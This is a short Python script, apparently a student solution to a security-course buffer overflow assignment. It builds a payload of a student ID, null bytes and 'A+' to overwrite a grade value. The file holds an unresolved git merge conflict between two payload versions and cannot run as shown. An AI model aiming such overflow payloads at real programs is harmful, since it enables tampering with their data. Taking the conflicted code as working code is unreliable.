import sys
from struct import pack
from shellcode import shellcode

# Implement your attack here!
<<<<<<< HEAD
payload =b'u1027506'
payload += b'\x00\x00'
payload += b'A+'
=======
payload = b'u1191447  A+'
>>>>>>> 62aae84b997c95554fa4bfc19cd556a251bc62cd

# Launch the attack!
sys.stdout.buffer.write(payload)
#print(payload)
